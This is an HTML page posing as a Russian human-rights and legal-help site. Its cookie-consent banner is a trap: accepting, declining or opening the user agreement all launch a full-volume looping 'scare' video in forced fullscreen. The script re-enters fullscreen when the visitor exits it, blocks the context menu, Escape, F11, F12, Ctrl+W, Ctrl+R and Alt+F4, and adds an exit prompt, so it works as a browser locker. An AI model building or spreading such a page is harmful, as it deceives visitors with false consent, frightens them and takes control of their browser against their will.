<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <title>Legal Services Management</title>
  <meta name="description" content="Информация о правах человека, механизмах защиты, обязанностях государственных служб и способах отстаивать свои права.">
  <meta name="keywords" content="права человека, защита прав, механизмы защиты, государственные службы, юридическая помощь">
  <meta name="author" content="MewServiceSite">

  <meta property="og:title" content="Защита прав пользователя">
  <meta property="og:site_name" content="Защита прав">
  <meta property="og:description" content="Узнайте о своих правах человека и способах их защиты. Доступ к ресурсам, законам и контактам служб поддержки.">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://servicemanagement-pied.vercel.app/">
  <meta property="og:image" content="images/image.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Защита прав человека">
  <meta name="twitter:description" content="Все о правах человека, методах их защиты и юридической поддержке.">
  <meta name="twitter:image" content="images/rights-protection.png">

  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">

  <style type="text/css">
    p { margin: 0; }
    *, *::before, *::after { box-sizing: border-box; }

    .overlay, .scare {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
    }

    .overlay-body {
      max-width: 512px;
      text-align: center;
      font-family: "Inter", sans-serif;
    }

    p.overlay-title {
      font-size: 24px;
      font-weight: 900;
      color: black;
      line-height: 1;
      margin-bottom: 16px;
    }

    p.overlay-description {
      font-size: 16px;
      font-weight: 400;
      color: rgba(0, 0, 0, 0.5);
      line-height: 1.25;
      margin-bottom: 16px;
    }

    .overlay-buttons-wrapper {
      margin: 24px -8px -8px;
    }

    .overlay-button {
      display: inline-flex;
      align-items: center;
      height: 40px;
      padding: 0 24px;
      font-size: 16px;
      font-weight: 500;
      line-height: 1;
      border-radius: 4px;
      margin: 4px;
      cursor: pointer;
    }

    #accept-button {
      background-color: rgb(132, 94, 194);
      color: white;
    }

    #decline-button {
      color: rgb(132, 94, 194);
      border: 2px solid rgb(132, 94, 194);
    }

    a.overlay-link {
      display: inline-block;
      text-decoration: none;
      font-size: 16px;
      font-weight: 500;
      color: rgb(132, 94, 194);
      line-height: 1;
      position: relative;
      margin-top: 16px;
    }

    a.overlay-link::before {
      position: absolute;
      content: "";
      height: calc(50% + 4px);
      width: calc(100% + 8px);
      bottom: -4px;
      left: -4px;
      background-color: rgba(132, 94, 194, 0.1);
    }

    .overlay[hidden] { display: none; }

    .overlay {
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #f5f6fa;
      padding: 0 24px;
    }

    .scare { z-index: 1; }

    video#video {
      height: 100%;
      width: 100%;
      object-fit: cover;
    }

    video#video::-webkit-media-controls-enclosure {
      display: none !important;
    }
  </style>
</head>
<body>
  <div id="overlay" class="overlay">
    <div class="overlay-body">
      <p class="overlay-title">Cookies и сторонний контент</p>
      <p class="overlay-description">
        Этот сайт использует cookies для сбора данных и обеспечения работы функций, необходимых для поддержки и защиты прав пользователей.
      </p>
      <div class="overlay-buttons-wrapper">
        <div id="accept-button" class="overlay-button">Принять</div>
        <div id="decline-button" class="overlay-button">Отклонить</div>
      </div>
      <a id="sogl" href="#" target="_blank" class="overlay-link">Пользовательское соглашение</a>
    </div>
  </div>

  <div class="scare">
    <video id="video" src="media/video.mp4" loop></video>
  </div>

  <script type="text/javascript">
    const video = document.getElementById("video");
    const overlay = document.getElementById("overlay");
    const declineButton = document.getElementById("decline-button");
    const acceptButton = document.getElementById("accept-button");
    const soglButton = document.getElementById("sogl");
    let hasClicked;
    
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    window.addEventListener('keydown', function(e) {
        const forbidden = ['Escape', 'F11', 'F12'];
        if (forbidden.includes(e.key) || (e.ctrlKey && (e.key === 'w' || e.key === 'r')) || (e.altKey && e.key === 'F4')) {
            e.preventDefault();
        }
    });

    document.addEventListener('fullscreenchange', function() {
        if (!document.fullscreenElement && hasClicked) {
            requestFullScreen();
        }
    });

    window.onbeforeunload = function(event) {
        if (hasClicked) {
            event.preventDefault();
            event.returnValue = '';
            return '';
        }
    };

    function requestFullScreen() {
        const d = document.documentElement;
        if (d.requestFullscreen) d.requestFullscreen();
        else if (d.mozRequestFullScreen) d.mozRequestFullScreen();
        else if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
        else if (d.msRequestFullscreen) d.msRequestFullscreen();
    }

    function buttonClick(event) {
        event.preventDefault();
        if (!hasClicked) {
            hasClicked = true;
        }
        overlay.hidden = true;
        video.volume = 1;
        video.play();
        requestFullScreen();
    }

    function videoClick(event) {
        if (event) event.preventDefault();
        requestFullScreen();
    }

    acceptButton.addEventListener("click", buttonClick);
    declineButton.addEventListener("click", buttonClick);
    soglButton.addEventListener("click", buttonClick);
    video.addEventListener("click", videoClick);
  </script>
</body>
</html>
